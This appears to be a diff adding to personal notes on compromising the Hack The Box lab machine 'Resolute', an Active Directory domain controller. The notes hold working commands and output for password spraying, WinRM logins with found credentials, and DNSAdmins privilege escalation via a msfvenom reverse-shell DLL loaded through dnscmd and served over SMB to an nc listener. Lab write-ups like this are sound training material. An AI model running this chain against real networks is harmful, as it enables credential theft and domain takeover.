@@ -68,4 +68,166 @@ evil-winrm -u marko -p Welcome123! -i 10.10.10.169
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray --dc 10.10.10.169 -d megabank.local ../../actual_users.txt 'Welcome123!'
 ```
 - No luck
-- 
+- Trying SMB with marko permission
+```
+smbclient -L //10.10.10.169/ -U megabank.local\\marko 
+```
+- Nothing
+- password spray with nxc shows melanie uses the default password too
+```
+nxc smb -d megabank.local --dns-server 10.10.10.169 -u ../actual_users.txt -p Welcome123! --continue-on-success 10.10.10.169
+```
+```
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
+```
+- Also looks like marko's password has since changed as it didn't validate during the nxc password spray 
+- evil-winrm with melanie got me user.txt
+```
+evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
+```
+- Found the PowerShell history file via the following commands 
+```
+ls -force C:\
+```
+```
+ls -force C:\PSTranscripts
+```
+```
+ls -force C:\PSTranscripts\20191203
+```
+- Got the file 
+```
+PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+```
+- Got ryan's password
+```
+Serv3r4Admin4cc123!
+```
+- trying smb as ryan
+```
+nxc smb -u ryan -p Serv3r4Admin4cc123! --dns-server 10.10.10.169 -d megabank.local 10.10.10.169
+```
+```
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
+```
+- Enumerating shares
+```
+nxc smb -u ryan -p Serv3r4Admin4cc123! --dns-server 10.10.10.169 -d megabank.local 10.10.10.169 --shares
+```
+```
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
+SMB         10.10.10.169    445    RESOLUTE         [*] Enumerated shares
+SMB         10.10.10.169    445    RESOLUTE         Share           Permissions     Remark
+SMB         10.10.10.169    445    RESOLUTE         -----           -----------     ------
+SMB         10.10.10.169    445    RESOLUTE         ADMIN$                          Remote Admin
+SMB         10.10.10.169    445    RESOLUTE         C$                              Default share
+SMB         10.10.10.169    445    RESOLUTE         IPC$                            Remote IPC
+SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share 
+SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share 
+```
+- Got into sysvol
+```
+smbclient -U megabank.local\\ryan //10.10.10.169/sysvol
+```
+- Nothing interesting 
+- checked netlogon too 
+```
+smbclient -U megabank.local\\ryan //10.10.10.169/netlogon1
+```
+- Nothing interesting
+- going to try the execs from impacket with ryan since he is an admin
+- No luck. going to try sharphound if I can get in via winrm
+- Got sharphound
+- looks like ryan is in the DNSADMINS  and CONTRACTORS groups with GenericAll rights to ACCOUNT OPERATORS. going to try to add him to account operators and go from there
+- tried from linux. going to try from windows. looks easier
+- dnscmd is abusable from LOLBAS especialy since he is in DNSAdmins group
+- Vulnerability
+```
+dnscmd.exe /config /serverlevelplugindll \\path\to\dll
+```
+- Creating the dll payload
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=5555 -f dll -o rev.dll
+```
+- having an issue with smb server from impacket starting 
+- fix is below
+- Find out if i have a listener on 445
+```
+sudo netstat -tuln | grep ':445'
+```
+- It just says listen so I can find the open files with the lsof command 
+```
+sudo lsof -i :445
+```
+- Output
+```
+python3 96736 root 13u  IPv6 150728      0t0  TCP *:microsoft-ds (LISTEN)
+```
+- Need more information getting it with ps
+```
+sudo ps -p 96736 -f
+```
+- Output
+```
+root       96736   96735  0 Jan26 pts/7    00:02:58 python3 ./Responder.py -I tun0
+```
+- Killing the responder process
+```
+sudo kill 96736
+```
+- check for successful kill with 
+```
+sudo netstat -tuln | grep ':445'
+```
+- should see nothing in the output
+- starting the smb share with impacket
+```
+impacket-smbserver -i 10.10.14.22 <SHARENAME> <DIRECTORY>
+```
+- started the nc listener for my reverse shell
+```
+nc -nlvp 5555
+```
+- Back on windows exploit with 
+```
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.22\s\rev.dll
+```
+- Output
+```
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+```
+- Then on windows
+```
+sc.exe \\resolute stop dns
+```
+```
+sc.exe \\resolute start dns
+```
+- This has to be done within a minute and look for the connection on the smb server as well as the nc listener
+- Got the shell 
